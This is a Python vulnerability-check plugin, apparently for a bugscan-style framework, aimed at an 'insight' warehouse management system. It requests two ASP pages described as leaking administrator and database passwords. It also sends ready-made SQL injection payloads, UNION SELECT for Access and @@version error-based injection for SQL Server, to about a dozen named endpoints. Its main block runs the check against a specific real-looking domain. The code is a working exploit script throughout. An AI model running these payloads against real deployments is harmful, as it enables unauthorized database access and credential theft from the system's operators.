#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: insight 仓储管理系统sql注入+信息泄露
author: yichin
refer:
    http://www.wooyun.org/bugs/wooyun-2010-0129390
    http://www.wooyun.org/bugs/wooyun-2010-0129392
'''

def assign(service, arg):
    if service == 'insight':
        return True, arg

def audit(arg):
    #信息泄露（包括管理员账号密码，数据库账号密码）
    payloads = [
        arg + 'gjdcx/ljsz.asp',
        arg + 'gjdcx/yhgl.asp'
    ]
    for payload in payloads:
        code, head, res, err, _ = curl.curl2(payload)
        if code == 200 and '密码'.decode('utf-8').encode('gb2312') in res:
            security_hole('info disclosure: ' + payload)
    #SQL注入 Access 注入
    payloads = [
        arg + 'gjdcx/cxszbj.asp?cxid=-7201%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,Exp(1)%20FROM%20MSysAccessObjects%16',
        arg + 'gjdcx/ljszbj.asp?ljid=-7201%20UNION%20ALL%20SELECT%20NULL,%20NULL,%20NULL,%20NULL,Exp(1)%20FROM%20MSysAccessObjects%16',
        arg + 'gjdcx/yhglbj.asp?userid=-1000%20union%20select%20Exp(1),Exp(1),Exp(1),Exp(1)%20FROM%20MSysAccessObjects%16'
    ]
    exp_1 = '2.71828182845905'
    for payload in payloads:
        code, head, res, err, _ = curl.curl2(payload)
        if code == 200 and exp_1 in res:
            security_hole('sql injection:' + payload)
    #SQL注入 SQL Server 注入
    payloads = [
        arg + 'csccmis/jctxx.asp?jcid=1%20and%201=@@version%20--',
        arg + 'csccmis/jczp.asp?jcid=1%20or%201=@@version%20--',
        arg + 'csccmis/jczpOld.asp?jcid=1%20or%201=@@version%20--',
        arg + 'csccmise/jczp.asp?jcid=1%20or%201=@@version%20--',
        arg + 'csccmise/jctxx.asp?jcid=1%20or%201=@@version%20--',
        arg + 'csccmissm/jctxx.asp?jcid=1%20or%201=@@version%20--',
        arg + 'csccmissm/jczp.asp?jcid=1%20or%201=@@version%20--',
        arg + 'csccmissm/jczpOld.asp?jcid=1%20or%201=@@version%20--',
    ]
    for payload in payloads:
        code, head, res, err, _ = curl.curl2(payload)
        #print res
        if code != 0 and 'Microsoft SQL Server' in res:
            security_hole('SQL injection: '+ payload)

    
if __name__ == '__main__':
    from dummy import *
    audit(assign('insight', 'http://www.nbskylark.com/')[1])